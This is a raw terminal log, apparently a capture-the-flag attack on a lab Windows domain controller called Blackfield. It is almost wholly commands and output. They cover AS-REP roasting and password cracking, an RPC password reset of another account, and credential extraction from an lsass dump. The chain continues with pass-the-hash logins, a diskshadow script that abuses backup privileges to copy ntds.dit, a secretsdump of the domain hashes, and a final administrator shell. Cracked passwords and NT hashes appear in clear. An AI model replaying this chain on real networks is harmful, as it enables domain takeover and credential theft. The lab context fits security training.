@@ -1,0 +1,342 @@
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //10.10.10.192 -N                                       
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	forensic        Disk      Forensic / Audit share.
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	profiles$       Disk      
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.10.10.192/profiles$ -N -c 'ls' | awk '{print $1}' | grep -vE '^\.$|^\.\.$|^blocks$' > users.txt
+                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-GetNPUsers blackfield.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.192
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+...
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$support@BLACKFIELD.LOCAL:5bfeb04a1c74df8540e6189da887c4d6$33b248c0202532041fb369f37fbae8ad79129137a19ebf43e4f7d233e3fd358f2df63da2153893d3d214a6cde334d06c45fc609824036b91e765193a595e7c939917f67aa77724b28e3cef1121c9f0b2d5f8b0055518e514acff0482110d1d11316679fdbbb821525047ccfb89fbdd8ba51c42194e9ae5fa84b16f11ee85abd22f0a40c4162d4bd3fcb49b046b0780cc7aaec3f1455453bae98c6ba53e739e7921c6214c744d051d9978498c79be71d3f467499c4e3762493c7e8565e97cf45bccbd5ab82f6fb62c2a58199af7d73041a5105083013d14c1125542ef61d754dd598b63e4feafe39e47c1e271280ff82fde340cfc
+[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+...
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$krb5asrep$23$support@BLACKFIELD.LOCAL:5bfeb04a1c74df8540e6189da887c4d6$33b248c0202532041fb369f37fbae8ad79129137a19ebf43e4f7d233e3fd358f2df63da2153893d3d214a6cde334d06c45fc609824036b91e765193a595e7c939917f67aa77724b28e3cef1121c9f0b2d5f8b0055518e514acff0482110d1d11316679fdbbb821525047ccfb89fbdd8ba51c42194e9ae5fa84b16f11ee85abd22f0a40c4162d4bd3fcb49b046b0780cc7aaec3f1455453bae98c6ba53e739e7921c6214c744d051d9978498c79be71d3f467499c4e3762493c7e8565e97cf45bccbd5ab82f6fb62c2a58199af7d73041a5105083013d14c1125542ef61d754dd598b63e4feafe39e47c1e271280ff82fde340cfc' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
+1g 0:00:00:13 DONE (2025-08-31 16:24) 0.07656g/s 1097Kp/s 1097Kc/s 1097KC/s #13Carlyn..##place##
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c all --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: blackfield.local
+...
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# net rpc password audit2020 'NewP@ssword2022' -U 'BLACKFIELD/support%#00^BlackKnight' -S 10.10.10.192
+                                                                                                                     
+may also use
+
+┌──(root㉿kali)-[/home/kali]
+└─# rpcclient -U 'support%#00^BlackKnight' 10.10.10.192
+rpcclient $> setuserinfo2 audit2020 23 NewPassword123!
+rpcclient $> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.10.10.192/forensic -U audit2020
+Password for [WORKGROUP\audit2020]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Feb 23 08:03:16 2020
+  ..                                  D        0  Sun Feb 23 08:03:16 2020
+  commands_output                     D        0  Sun Feb 23 13:14:37 2020
+  memory_analysis                     D        0  Thu May 28 16:28:33 2020
+  tools                               D        0  Sun Feb 23 08:39:08 2020
+
+		5102079 blocks of size 4096. 1650784 blocks available
+smb: \> cd memory_analysis
+smb: \memory_analysis\> ls
+  .                                   D        0  Thu May 28 16:28:33 2020
+  ..                                  D        0  Thu May 28 16:28:33 2020
+  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
+  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
+  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
+  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
+  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
+  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
+  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
+  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
+  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
+  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
+  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
+  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
+  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
+  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
+  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
+  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020
+
+		5102079 blocks of size 4096. 1650801 blocks available
+smb: \memory_analysis\> get lsass.zip
+getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (3287.6 KiloBytes/sec) (average 3251.8 KiloBytes/sec)
+smb: \memory_analysis\>
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# pypykatz lsa minidump lsass.DMP > creds.txt
+
+
+checking lockout policy
+┌──(root㉿kali)-[/home/kali]
+└─# ldapsearch -x -H ldap://10.10.10.192 -D "BLACKFIELD\support" -w '#00^BlackKnight' -b "dc=blackfield,dc=local" -s sub "(objectClass=domain)" lockoutThreshold
+# extended LDIF
+#
+# LDAPv3
+# base <dc=blackfield,dc=local> with scope subtree
+# filter: (objectClass=domain)
+# requesting: lockoutThreshold 
+#
+
+# BLACKFIELD.local
+dn: DC=BLACKFIELD,DC=local
+lockoutThreshold: 0
+
+# search reference
+ref: ldap://ForestDnsZones.BLACKFIELD.local/DC=ForestDnsZones,DC=BLACKFIELD,DC
+ =local
+
+# search reference
+ref: ldap://DomainDnsZones.BLACKFIELD.local/DC=DomainDnsZones,DC=BLACKFIELD,DC
+ =local
+
+# search reference
+ref: ldap://BLACKFIELD.local/CN=Configuration,DC=BLACKFIELD,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 5
+# numEntries: 1
+# numReferences: 3
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+                                                                                                            
+┌──(root㉿kali)-[/home/kali]
+└─# pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes
+INFO:pypykatz:Parsing file lsass.DMP
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users
+INFO:pypykatz:Parsing file lsass.DMP
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# crackmapexec smb 10.10.10.192 -u users -H hashes
+SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+...
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
+
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> 
+
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> robocopy C:\Windows\NTDS C:\temp NTDS.dit /B
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Sunday, August 31, 2025 9:15:44 PM
+   Source : C:\Windows\NTDS\
+     Dest : C:\temp\
+
+    Files : NTDS.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+	  New Dir          1	C:\Windows\NTDS\
+	    New File  		  18.0 m	ntds.dit
+2025/08/31 21:15:44 ERROR 32 (0x00000020) Copying File C:\Windows\NTDS\ntds.dit
+The process cannot access the file because it is being used by another process.
+
+^Cf
+                                        
+Warning: Press "y" to exit, press any other key to continue
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> reg save HKLM\SYSTEM C:\temp\SYSTEM /y
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> 
+
+
+
+create and upload 
+vss.dsh
+
+set context persistent nowriters
+set metadata c:\\programdata\\test.cab
+set verbose on
+add volume c: alias test
+create
+expose %test% z:
+
+
+
+
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> upload vss.dsh
+                                        
+Info: Uploading /home/kali/vss.dsh to C:\Users\svc_backup\Downloads\vss.dsh
+                                        
+Data: 188 bytes of 188 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> diskshadow /s C:\Users\svc_backup\Downloads\vss.dsh
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  9/1/2025 1:41:22 AM
+
+-> set context persistent nowriters
+-> set metadata c:\\programdata\\test.cab
+-> set verbose on
+-> add volume c: alias test
+-> create
+
+Alias test for shadow ID {5611735c-ee5b-45a3-9c74-9620d2e3f41a} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {0d0a6ab5-88a9-47a0-8a1b-c11296affdd9} set as environment variable.
+Inserted file Manifest.xml into .cab file test.cab
+Inserted file DisAB88.tmp into .cab file test.cab
+
+Querying all shadow copies with the shadow copy set ID {0d0a6ab5-88a9-47a0-8a1b-c11296affdd9}
+
+	* Shadow copy ID = {5611735c-ee5b-45a3-9c74-9620d2e3f41a}		%test%
+		- Shadow copy set: {0d0a6ab5-88a9-47a0-8a1b-c11296affdd9}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
+		- Creation time: 9/1/2025 1:41:24 AM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+		- Originating machine: DC01.BLACKFIELD.local
+		- Service machine: DC01.BLACKFIELD.local
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %test% z:
+-> %test% = {5611735c-ee5b-45a3-9c74-9620d2e3f41a}
+The shadow copy was successfully exposed as z:\.
+->
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\Users\svc_backup\Downloads\ntds.dit
+reg save HKLM\SYSTEM C:\Users\svc_backup\Downloads\SYSTEM
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> download ntds.dit
+download SYSTEM
+                                        
+Info: Downloading C:\Users\svc_backup\Downloads\SYSTEM to SYSTEM
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> ls
+
+
+    Directory: C:\Users\svc_backup\Downloads
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         9/1/2025   1:41 AM       18874368 ntds.dit
+-a----        8/31/2025  10:14 PM         460288 RawCopy64.exe
+-a----         9/1/2025  12:02 AM          12288 SeBackupPrivilegeCmdLets.dll
+-a----         9/1/2025  12:02 AM          16384 SeBackupPrivilegeUtils.dll
+-a----         9/1/2025   1:41 AM       17580032 SYSTEM
+-a----         9/1/2025   1:41 AM            142 vss.dsh
+
+
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> download ntds.dit
+                                        
+Info: Downloading C:\Users\svc_backup\Downloads\ntds.dit to ntds.dit
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > blackfield    
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-wmiexec -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
